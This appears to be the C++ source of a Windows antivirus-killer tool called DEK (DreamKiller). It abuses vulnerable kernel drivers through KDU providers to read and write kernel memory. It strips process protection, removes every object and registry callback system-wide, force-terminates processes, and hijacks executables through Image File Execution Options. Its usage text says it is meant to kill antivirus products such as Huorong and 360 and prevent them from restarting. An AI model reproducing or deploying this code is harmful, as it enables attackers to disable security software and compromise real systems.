#include "global.h"
#include "DreamKiller/KduProvider.h"

#include <string>

KDU_CONTEXT* KDUProviderCreate_auto(
    _In_ ULONG ProviderId,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{

    LONG NtBuildNumber;
    BOOLEAN HvciEnabled;
    BOOLEAN hvciStrict;
    BOOLEAN hvciIUM;

    //
    // Providers maybe *not* HVCI compatible.
    //
    if (supQueryHVCIState(&HvciEnabled, &hvciStrict, &hvciIUM)) {

        if (HvciEnabled) {
            printf_s("[*] Windows HVCI mode detected\r\n");
        }
    }

    OSVERSIONINFO osv;
    CHAR vendorString[0x20];

    RtlFillMemory(vendorString, sizeof(vendorString), 0);
    GET_CPU_VENDOR_STRING(vendorString);
    printf_s("[*] CPU vendor string: %s\r\n", vendorString);

    RtlSecureZeroMemory(&osv, sizeof(osv));
    osv.dwOSVersionInfoSize = sizeof(osv);
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);

    NtBuildNumber = osv.dwBuildNumber;

    return KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDKOM);
}

// Set ppl of process
INT KDUProcessPSObjectSwitch(
    _In_ ULONG ProviderId,
    _In_ ULONG_PTR ProcessId,
    _In_ PS_PROTECTED_SIGNER PsProtectionSigner = PsProtectedSignerNone,
    _In_ PS_PROTECTED_TYPE PsProtectionType = PsProtectedTypeNone
)
{

    KDU_CONTEXT* Context;

    BOOL       bResult = FALSE;
    Context = KDUProviderCreate_auto(ProviderId, KDU_SHELLCODE_NONE, ActionTypeDKOM);

    if (Context)
    {
        // copy from ps.cpp BOOL KDUControlProcessProtections(
        {
            ULONG      Buffer;
            NTSTATUS   ntStatus;
            ULONG_PTR  ProcessObject = 0, VirtualAddress = 0;
            HANDLE     hProcess = NULL;

            KDU_EPROCESS_OFFSETS offsets;
            CLIENT_ID clientId;
            OBJECT_ATTRIBUTES obja;

            if (!KDUVerifyProviderCallbacksForPsPatch(Context))
                return FALSE;

            FUNCTION_ENTER_MSG(__FUNCTION__);

            InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

            clientId.UniqueProcess = (HANDLE)ProcessId;
            clientId.UniqueThread = NULL;

            ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
                &obja, &clientId);

            if (NT_SUCCESS(ntStatus)) {

                printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
                bResult = supQueryObjectFromHandle(hProcess, &ProcessObject);

                if (bResult && (ProcessObject != 0)) {

                    printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

                    if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
                        offsets.PsProtectionOffset == 0)
                    {
                        supPrintfEvent(kduEventError,
                            "[!] Unsupported WinNT version\r\n");

                    }
                    else {

                        VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, offsets.PsProtectionOffset);

                        printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);

                        Buffer = 0;

                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress,
                            &Buffer,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                            printProtection(Buffer);

                            Buffer = (Buffer & 0xFFFFFF00) | ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));

                            bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                                VirtualAddress,
                                &Buffer,
                                sizeof(UCHAR));

                            if (bResult) {
                                printf_s("[+] Process object modified\r\n");

                                ULONG verifyBuf = 0;
                                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                                    VirtualAddress,
                                    &verifyBuf,
                                    sizeof(UCHAR)))
                                {
                                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                                    printf_s("\tNew PsProtection: 0x%02X\n", verifyBuf & 0xff);
                                    printProtection(verifyBuf);
                                }
                            }
                            else {

                                supPrintfEvent(kduEventError,
                                    "[!] Cannot modify process object\r\n");

                            }
                        }
                        else {

                            supPrintfEvent(kduEventError,
                                "[!] Cannot read kernel memory\r\n");

                        }
                    }
                }
                else {
                    supPrintfEvent(kduEventError,
                        "[!] Cannot query process object\r\n");
                }
                NtClose(hProcess);
            }
            else {
                supShowHardError("[!] Cannot open target process\r\n", ntStatus);
            }

            FUNCTION_LEAVE_MSG(__FUNCTION__);

        }
        KDUProviderRelease(Context);
        return bResult;
    }
	return FALSE;
}

// Helper: get ObCallbackList offset, and return the ObjectType address
ULONG GetObCallbackListOffset(const KduProvider& provider, PULONG64 ObjectTypeAddr)
{
    constexpr int FLINK_OFFSET = 0, BLINK_OFFSET = sizeof(PLIST_ENTRY);

    PVOID* ppProcessType = (PVOID*)MmGetSystemRoutineAddress(provider, "PsProcessType");
    printf_s("[+] psProcessType at 0x%p \n", ppProcessType);
    if (!ppProcessType)
        return 0;
    PUCHAR pObjectType;// = (PUCHAR)(*ppProcessType);
    provider.ReadKernelVirtual((ULONG64)ppProcessType, (PVOID)& pObjectType, sizeof(PUCHAR));
    if (!MmIsAddressValid(provider, pObjectType))
        return 0;

    for (ULONG i = 0; i <= 0x200; i += sizeof(ULONG_PTR))
    {
        LIST_ENTRY ListHead;
        PLIST_ENTRY pListHead = &ListHead;
        PLIST_ENTRY pListHead_Kernel = (PLIST_ENTRY)(pObjectType + i);
        if (!MmIsAddressValid(provider, (PLIST_ENTRY)(pObjectType + i)))
            continue;
        provider.ReadKernelVirtual((ULONG64)(pObjectType + i), pListHead, (sizeof(LIST_ENTRY)));
		// verify the list structure, by checking its Flink/Blink
        PLIST_ENTRY pfLink = pListHead->Flink;
        PLIST_ENTRY pbLink = pListHead->Blink;
        if (!MmIsAddressValid(provider, pfLink) || !MmIsAddressValid(provider, pbLink))
            continue;
        if (pfLink == pListHead_Kernel)
            continue;
        PLIST_ENTRY pFlink_Blink, pBlink_Flink;

        provider.ReadKernelVirtual(((ULONG64)pfLink + BLINK_OFFSET), &pFlink_Blink, sizeof(PLIST_ENTRY));
        provider.ReadKernelVirtual(((ULONG64)pbLink + FLINK_OFFSET), &pBlink_Flink, sizeof(PLIST_ENTRY));

        if (pFlink_Blink == pListHead_Kernel && pBlink_Flink == pListHead_Kernel)
        {
            *ObjectTypeAddr = (ULONG64)(pObjectType);
            return i;
        }
    }
    return 0;
}

// Remove ObCallback
// !!note: this will remove all ObCallback in the system, be cautious.
bool RemoveObCallback(_In_ ULONG ProviderId)
{
    KduProvider kduprov(ProviderId, KDU_SHELLCODE_NONE, ActionTypeDKOM);

    ULONG64 ObjectTypeAddr = 0;
    ULONG CallbackListOffset = GetObCallbackListOffset(kduprov, &ObjectTypeAddr);
    printf_s("[+] callbackListOffset = %d, ObjectTypeAddr = 0x%p\n", CallbackListOffset, (PVOID)ObjectTypeAddr);
    if (!CallbackListOffset || !ObjectTypeAddr)
        return false;
    LIST_ENTRY ListHead;
    PLIST_ENTRY pListHead = &ListHead;// = (PLIST_ENTRY)(ObjectTypeAddr + CallbackListOffset);
    kduprov.ReadKernelVirtual(ObjectTypeAddr + CallbackListOffset, pListHead, sizeof(LIST_ENTRY));
    
    PLIST_ENTRY pCurrent = pListHead->Flink;
    int count = 0;
    while (pCurrent != (PLIST_ENTRY)(ObjectTypeAddr + CallbackListOffset) && count < 500)
    {
        if (!MmIsAddressValid(kduprov, pCurrent))
            break;
        ULONG_PTR pItem = (ULONG_PTR)pCurrent;
        if (MmIsAddressValid(kduprov, (PVOID)(pItem + 0x10)))
        {
            ULONG a = 0;
            kduprov.WriteKernelVirtual(pItem + 0x10, &a, sizeof(ULONG));
            printf_s("[*] remove ObPreOperationCallback at %p\n", (PVOID)(pItem + 0x10));
        }
        kduprov.ReadKernelVirtual((ULONG64)(pCurrent + 0), &pCurrent, sizeof(PLIST_ENTRY));
        count++;
    }
    return true;
}

// Helper : check if the Flink/Blink at Addr is self-referencing or forms a valid double-linked list
bool CheckCmCallbackHead(const KduProvider &provider, ULONG64 addr)
{
    LIST_ENTRY ListHead;
    if (!provider.ReadKernelVirtual(addr, &ListHead, sizeof(LIST_ENTRY)))
        return false;

    if ((ULONG64)ListHead.Blink >= 0xffff000000000000ull && \
        (ULONG64)ListHead.Flink >= 0xffff000000000000ull
        )
    {
        if ((ULONG64)ListHead.Blink == addr && (ULONG64)ListHead.Flink == addr)
            return true;

        LIST_ENTRY Flink;
        provider.ReadKernelVirtual((ULONG64)ListHead.Flink, &Flink, sizeof(LIST_ENTRY));
        if ((ULONG64)Flink.Blink == addr)
            return true;
    }
    return false;
}

// remove CmCallback
// !!note: this will remove all CmCallback in the system, be cautious.
bool RemoveCmCallback(_In_ ULONG ProviderId)
{
    KduProvider provider(ProviderId, KDU_SHELLCODE_NONE, ActionTypeDKOM);
    ULONG64 pCmUnRegisterCallback = MmGetSystemRoutineAddress(provider, "CmUnRegisterCallback");
    ULONG64 pCmCallbackList = 0;
    
    BYTE* buffer = new BYTE[4 * 1024];

    printf_s("[*] found CmUnRegisterCallback at 0x%p\n", (PVOID)pCmUnRegisterCallback);

	// Read 1 page. (8 bytes each time, to avoid potential page boundary issues.)
    for (int i = 0; i < 4 * 1024; i += 8)
        provider.ReadKernelVirtual(pCmUnRegisterCallback + i, buffer + i, 8);

    for (ULONG offset = 0; offset < 0x1000 - 2; offset++)
    {

        if ((buffer[offset] == 0x48 && buffer[offset + 1] == 0x8d && buffer[offset + 2] == 0x0d) || // lea rcx, [rip + xxx]
            (buffer[offset] == 0x49 && buffer[offset + 1] == 0x8d && buffer[offset + 2] == 0x1d))   // lea r9, [rip + xxx]
        {
            // func_addr + offset = rip
            // rip + 32bit imm + 7 (= lea instruction size)  = addr
            ULONG64 addr = pCmUnRegisterCallback + offset + *(int*)(buffer + offset + 3) + 7;

			// 1. lea instruction directly points to CmCallbackListHead, 
            //  -> check if the Flink/Blink at that address is self-referencing or forms a valid double-linked list
            if (CheckCmCallbackHead(provider, addr))
            {
                pCmCallbackList = addr;
                break;
			}

			// 2. lea instruction points to an intermediate address, 
            //    which stores the address of CmCallbackListHead.
			//  -> fetch the value at that address, and check Flink/Blink
            ULONG64 relAddr = 0;
            provider.ReadKernelVirtual(addr, &relAddr, sizeof(ULONG64));
            if (CheckCmCallbackHead(provider, relAddr))
            {
                pCmCallbackList = relAddr;
                break;
            }
        }
    }

    delete[] buffer;

    if (!pCmCallbackList)
        return false;

    printf_s("[+] Found CmCallbackListHead VA : 0x%llX\n", pCmCallbackList);

	// disable the callback by isolating the list head (self-loop), 
    // (instead of removing the entries in the list, to avoid potential BSOD due to structure changes.)

    LIST_ENTRY self = { (PLIST_ENTRY)pCmCallbackList, (PLIST_ENTRY)pCmCallbackList };

    if (!provider.WriteKernelVirtual(pCmCallbackList, &self, sizeof(LIST_ENTRY)))
		return false;

	// verify (by checking if the Flink/Blink is self-referencing now)
	LIST_ENTRY verify;
    if (!provider.ReadKernelVirtual(pCmCallbackList, &verify, sizeof(LIST_ENTRY)))
        return false;
    if (verify.Flink != (PLIST_ENTRY)pCmCallbackList || verify.Blink != (PLIST_ENTRY)pCmCallbackList)
        return false;
    printf_s("[+] CmCallback list head isolated successfully.\n");
	return true;
}

// hijack image (by setting Debugger value in Image File Execution Options registry key)
bool SetImageFileExecutionOptions(std::string targetExe, std::string debuggerPath)
{
    HKEY hKey;

	std::string basePath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";

    if (targetExe.find("\\") != std::string::npos)
    {
        size_t pos = targetExe.find_last_of("\\");
        if (pos != std::string::npos && pos + 1 < targetExe.size())
        {
			targetExe = targetExe.substr(pos + 1);
        }
    }

	std::string keyPath = basePath + targetExe;
	LONG result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE, 
        keyPath.c_str(), 
        0, NULL, 
        REG_OPTION_NON_VOLATILE, 
        KEY_WRITE, NULL, 
        &hKey, NULL
    );

    if (result != ERROR_SUCCESS)
        return false;

	printf("[+] Registry key created: %ls\n", keyPath.c_str());

	std::string valueNameStr = "Debugger";
    result = RegSetValueExA(
        hKey, 
        valueNameStr.c_str(), 
        0, 
        REG_SZ, 
        (const BYTE*)debuggerPath.c_str(), 
        (debuggerPath.size() + 1) * sizeof(wchar_t)
    );
    RegCloseKey(hKey);
    if (result != ERROR_SUCCESS)
		return false;
    return true;
}

// maybe The STRONGEST function run in Ring3 to kill process 
BOOLEAN WinStationTerminateProcess(ULONG pid)
{
    typedef BOOLEAN(NTAPI* fnWinStationTerminateProcess)(HANDLE, ULONG, ULONG);
    fnWinStationTerminateProcess pWinStationTerminateProcess = (fnWinStationTerminateProcess)GetProcAddress(LoadLibraryA("winsta.dll"), "WinStationTerminateProcess");
    return pWinStationTerminateProcess(nullptr, pid, 0);
}

bool ParaseCmdLine(int argc, char *argv[], int tab[7])
{
    if (argc < 2)
		return false;
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "-list") == 0)
            tab[0] = i;
        else if (strcmp(argv[i], "-prv") == 0)
        {
            if (i + 1 < argc)
                tab[1] = i;
            else
                return false;
        }
        else if (strcmp(argv[i], "-ps") == 0)
        {
            if (i + 1 < argc)
                tab[2] = i;
            else
                return false;
        }
        else if (strcmp(argv[i], "-ob") == 0)
            tab[3] = i;
        else if (strcmp(argv[i], "-cm") == 0)
            tab[4] = i;
        else if (strcmp(argv[i], "-kill") == 0)
        {
            if (i + 1 < argc)
                tab[5] = i;
            else
                return false;
        }
        else if (strcmp(argv[i], "-hi") == 0)
        {
            if (i + 2 < argc)
                tab[2] = i;
            else
                return false;
        }
    }
    return true;
}

int main(int argc, char* argv[])
{
    if (!ntsupUserIsFullAdmin()) {
        supPrintfEvent(kduEventError, "[!] Administrator privileges are required to continue.\r\n"\
            "[!] Verify that you have sufficient privileges and you are not running program under any compatibility layer.\r\n");
        return -1;
    }

    int tab[7] = { 0 }, retVal = -1;
    int providerId = 34;

    if (!ParaseCmdLine(argc, argv, tab))
    {
        printf("[?] No valid parameters combination specified or command is not recognized, see Usage for help\r\n"\
            "[?] Usage: DEK [Provider][Command]\r\n\n"\
            "Parameters: \r\n"\
            "DEK -list                    - List available providers\r\n"\
            "DEK -prv id                  - Optional, sets provider id to be used with rest of commands, default 34\r\n"\
            "DEK -ps pid                  - Disable ProtectedProcess for given pid\r\n"\
            "DEK -ob                      - Remove ObCallbacks (all callbacks in the system will be removed, be cautious)\r\n"\
            "DEK -cm                      - Remove CmCallbacks (all callbacks in the system will be removed, be cautious)\r\n"\
            "DEK -kill pid                - Kill process by PID\r\n"\
            "DEK -hi ExePath DbgPath      - Set Image File Execution Options to hijack target executable\r\n"\
            "U can use DEK -prv id -ps pid -ob -cm -kill pid -hi targetExePath debuggerPath \r\n"\
            "  to abort AV process(Huorong & 360 etc.£© and prevent them from comming back :P\r\n"
        );

    }
    else
    {
        do {
            if (tab[0])
            {
                KDUProvList();
                retVal = 1;
                break;
            }

            retVal = 0;

            if (tab[1])
            {
                providerId = strtoul(argv[tab[1] + 1], nullptr, 0);
                printf_s("[*] Provider ID set to %lu\n", providerId);
            }
            if (tab[2])
            {
                ULONG_PTR pid = strtoull(argv[tab[2] + 1], nullptr, 0);
                if (KDUProcessPSObjectSwitch(providerId, pid))
                    printf_s("[+] Process with PID %llu is no longer protected.\n", pid);
                else
                {
                    printf_s("[!] Failed to disable ProtectedProcess for PID %llu\n", pid);
                    retVal = -1;
                }
            }
            if (tab[3])
            {
                if (RemoveObCallback(providerId))
                    printf_s("[+] ObCallbacks removed successfully.\n");
                else
                {
                    printf_s("[!] Failed to remove ObCallbacks.\n");
					retVal = -1;
                }
			}
            if (tab[4])
            {
                if (RemoveCmCallback(providerId))
                    printf_s("[+] CmCallbacks removed successfully.\n");
                else
                {
                    printf_s("[!] Failed to remove CmCallbacks.\n");
					retVal = -1;
                }
            }
            if (tab[5])
            {
                ULONG_PTR pid = strtoull(argv[tab[5] + 1], nullptr, 0);
                if (WinStationTerminateProcess(pid))
                    printf_s("[+] Process with PID %llu terminated successfully.\n", pid);
                else
                {
                    printf_s("[!] Failed to terminate process with PID %llu\n", pid);
					retVal = -1;
                }
            }
            if (tab[6])
            {
                std::string targetExe = std::string(argv[tab[6] + 1]);
                std::string debuggerPath = std::string(argv[tab[6] + 2]);
                if (SetImageFileExecutionOptions(targetExe, debuggerPath))
                    printf_s("[+] Image File Execution Options set successfully for %ls with debugger %ls.\n", targetExe.c_str(), debuggerPath.c_str());
                else
                {
                    printf_s("[!] Failed to set Image File Execution Options for %ls.\n", targetExe.c_str());
					retVal = -1;
                }
            }

        } while (false);
    }
    printf_s("[+] Return value: %d. Bye-bye!\r\n", retVal);
}